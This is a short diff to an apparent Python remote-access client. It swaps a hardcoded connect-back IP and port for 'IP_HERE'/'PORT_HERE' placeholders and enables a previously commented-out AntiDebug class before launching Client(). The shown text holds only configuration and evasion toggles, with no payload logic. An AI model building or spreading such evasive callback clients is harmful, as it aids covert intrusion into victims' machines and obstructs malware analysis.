@@ -39,8 +39,8 @@ from time import sleep
 from ctypes import *
 
 
-IP   = "192.168.0.2"
-PORT = int("1888")
+IP   = "IP_HERE"
+PORT = int("PORT_HERE")
 
 
 class AntiDebug():
@@ -551,5 +551,5 @@ if __name__ == "__main__":
     try: requests.get('https://google.com')
     except: os._exit(1)
 
-    # AntiDebug().start()
+    AntiDebug().start()
     Client()
